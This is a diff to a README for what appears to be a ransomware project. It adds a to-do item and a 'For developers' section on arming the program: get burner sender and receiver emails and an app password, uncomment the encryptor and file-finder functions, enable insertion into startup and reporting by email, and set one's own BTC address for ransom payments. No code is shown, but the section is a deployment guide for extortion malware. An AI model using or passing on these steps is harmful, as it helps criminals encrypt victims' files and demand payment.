@@ -13,6 +13,7 @@ This code is tested per piece so I am not sure if it works but theoritically it 
 - [X] fix it so it doesnt quit before decrypting all files
 - [x] Fix first run issue
 - [ ] Check if the amount of files are actually real later
+- [ ] Fix the grammar error on the label
 
 ## Preview
 ![image](https://user-images.githubusercontent.com/94969176/209453408-bd16a293-23e2-43e0-8f96-29de4b4069dd.png)
@@ -23,3 +24,12 @@ This code is tested per piece so I am not sure if it works but theoritically it 
 
 ## Installation
 TBD
+### For developers
+- Get 2 burner emails
+- Put it on `SENDER` and `RECEIVER` variable on the top
+![image](https://user-images.githubusercontent.com/94969176/209453494-5b28cf52-523c-4ffa-9ff8-4d07c4d9a6b6.png)
+
+- Get an app password for the `SENDER` email
+- Install dependencies modules
+- remove the commented out encryptor, decryptor, and find_file function alongside the function call on the bottom for inserting to startup and sending via email (I heavily advice against removing the commented out tkinter attributes and configs)
+- Change the BTC address to your own (Unnecessary if you just want a preview)
